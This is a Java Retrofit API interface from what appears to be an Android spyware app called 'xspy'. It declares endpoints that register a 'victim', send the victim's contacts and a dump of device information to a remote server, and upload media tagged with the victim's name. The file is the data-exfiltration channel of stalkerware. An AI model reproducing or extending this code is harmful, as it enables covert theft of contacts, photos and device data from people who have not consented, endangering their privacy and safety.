package com.redeyesncode.xspy.retrofit;

import com.google.gson.JsonElement;
import com.redeyesncode.xspy.models.DeviceInfoBody;

import java.util.HashMap;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.GET;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;

public interface ApiInterface {


    @GET("hello")
    Call<JsonElement> checkServer();


    @POST("addNewVictim")
    Call<JsonElement> addVictim(@Body HashMap<String , String> victimName);

    @POST("saveVictimsContact")
    Call<JsonElement> saveVictimsContact(@Body HashMap<String, String> victimContactModel);

    @POST("dumpDeviceInfo")
    Call<JsonElement> dumpDeviceInfo(@Body DeviceInfoBody deviceInfoBody);


    @Multipart
    @POST("upload")
    Call<JsonElement> uploadMedia(@Part MultipartBody.Part imgeProfile, @Part("victim_name")RequestBody victimName);

}
